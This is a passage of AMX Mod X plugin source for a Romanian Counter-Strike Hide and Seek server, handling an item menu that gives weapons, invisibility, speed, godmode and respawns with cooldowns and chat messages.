			give_item ( id, "weapon_usp" );

			new eNtry = find_ent_by_owner ( -1, "weapon_usp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 3 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 USP 3GL^x01 !" );

			count2[id]=5;
		}

		case 3:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_usp" );

			give_item ( id, "weapon_hegrenade" );

			cs_set_user_bpammo ( id, CSW_HEGRENADE, 3 );

			new eNtry = find_ent_by_owner ( -1, "weapon_usp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 3 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 x3 HE + USP 2GL^x01 !" );
		}

		case 4:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			set_user_rendering ( id, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 0 );

			set_task ( 7.0, "RemoveInvis", id );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Invizibilitate 7S^x01 !" );
		}

		case 5:
		{
			if ( count3 [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 M4A1^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count3 [ id ], count3 [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_m4a1" );

			new eNtry = find_ent_by_owner ( -1, "weapon_m4a1", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 3 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 M4A1 3GL^x01 !" );

			count3[id]=5;
		}

		case 6:
		{
			if ( count4 [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AK47^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count4 [ id ], count4 [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			if(user_has_weapon(id,CSW_AK47))
			{
				ColorChat(id,NORMAL,"^x04[HnS.Play-Arena.Ro]^x01 Ai deja^3 AK47")
				return PLUGIN_HANDLED
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_ak47" );

			new eNtry = find_ent_by_owner ( -1, "weapon_ak47", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 3 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AK47 3GL^x01 !" );

			count4[id]=5;
		}

		case 7:
		{
			if ( count [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			if(user_has_weapon(id,CSW_AWP))
			{
				ColorChat(id,NORMAL,"^x04[HnS.Play-Arena.Ro]^x01 Ai deja^3 AWP")
				return PLUGIN_HANDLED
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_awp" );

			new eNtry = find_ent_by_owner ( -1, "weapon_awp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 3 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AWP 3GL^x01 !" );

			count [ id ] = 5;
		}

		case 8:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			HaveSpeed [ id ] = true;

			Event_CurWeapon ( id );

			set_task ( 7.0, "remove_speed", id );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 + 300 Viteza 7S^x01 !" );
		}

		case 9:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			set_user_godmode ( id, 1 );

			set_task ( 10.0, "remove_godmode", id );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Godmode 10S^x01 !" );
		}

		case 10:
		{
			if ( !is_user_alive ( id ) )
			{
				if ( incercari2 [ id ] == 3 )
				{
					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai cumparat deja^x04 Respawn^x01 de^x03 3^x01 ori !" );

					return PLUGIN_HANDLED;
				}
				else
				{
					//AlreadyChoosed [ id ] = true;

					ExecuteHamB ( Ham_CS_RoundRespawn, id );

					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( mai ai inca^x04 %i^x01 reinvier%s )", 2 - incercari2 [ id ], incercari2 [ id ] == 1 ? "e" : "i" );

					incercari2 [ id ] += 1;

					return PLUGIN_HANDLED;
				}
			}

			else if ( is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi^x03 MORT^x01 ca sa cumperi^x04 RESPSAWN^x01 !" );

				return PLUGIN_HANDLED;
			}
		}
	}

	menu_destroy ( menu );
	return 0;
}

public RemoveInvis ( id )
{
	set_user_rendering ( id, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 255 );

	ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Acum esti dinou^x03 Vizibil^x01 !" );
}

public remove_speed ( id )
{
	if( HaveSpeed [ id ] )
	{
		HaveSpeed [ id ] = false;

		ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu mai ai^x03 + 300 Viteza^x01 !" );
	}

	if ( HaveSpeed2 [ id ] )
	{
		HaveSpeed2 [ id ] = false;

		ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu mai ai^x03 + 270 Viteza^x01 !" );
	}
}

public remove_godmode ( id )
{
	set_user_godmode ( id, 0 );

	ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu mai ai^x03 Godmode^x01 !" );
}

public Event_CurWeapon ( id )
{
	if ( HaveSpeed [ id ] )
	{
		set_user_maxspeed ( id, 300.0 );
	}

	if ( HaveSpeed2 [ id ] )
	{
		set_user_maxspeed ( id, 270.0 );
	}
}

public msgScoreAttrib(msgid, dest, id)
{
    new id = get_msg_arg_int(1);
    if( ( get_user_flags ( id ) & ADMIN_LEVEL_D ) || ( get_user_flags ( id ) & ADMIN_LEVEL_H ) || ( get_user_flags ( id ) & ADMIN_RCON ) && ( get_user_team ( id ) == 2 ))
    	set_msg_arg_int(2, ARG_BYTE, is_user_alive(id) ? (1<<2) : (1<<0));

    return PLUGIN_CONTINUE;
}

public client_disconnect ( id )
{
	AlreadyChoosed [ id ] = false;

	HaveSpeed [ id ] = false;
	HaveSpeed2 [ id ] = false;

	incercari [ id ] = 0;
	incercari1 [ id ] = 0;
	incercari2 [ id ] = 0;

	count [ id ] = 0;

	count2 [ id ] = 0;
	count3 [ id ] = 0;
	count4 [ id ] = 0;

	if ( task_exists ( id ) )
	{
		remove_task ( id );
	}
}

#pragma semicolon	1
